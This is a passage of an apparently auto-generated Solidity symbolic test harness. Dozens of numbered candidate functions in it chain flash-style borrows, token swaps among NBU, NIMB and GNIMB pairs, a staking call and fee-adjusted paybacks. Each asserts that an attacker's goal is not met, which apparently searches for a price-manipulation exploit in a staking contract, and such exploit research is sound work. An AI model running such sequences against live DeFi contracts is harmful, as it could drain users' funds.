        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand535(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand536(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand537(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand538(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand539(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand540(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand541(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand542(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand543(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand544(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand545(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand546(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand547(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand548(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand549(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand550(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand551(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand552(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand553(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand554(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand555(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand556(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand557(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand558(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand559(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand560(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand561(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand562(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand563(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand564(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand565(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand566(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand567(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand568(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand569(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand570(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand571(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand572(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand573(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand574(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand575(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand576(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand577(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand578(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand579(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand580(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand581(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand582(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand583(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand584(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand585(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand586(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand587(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand588(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand589(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
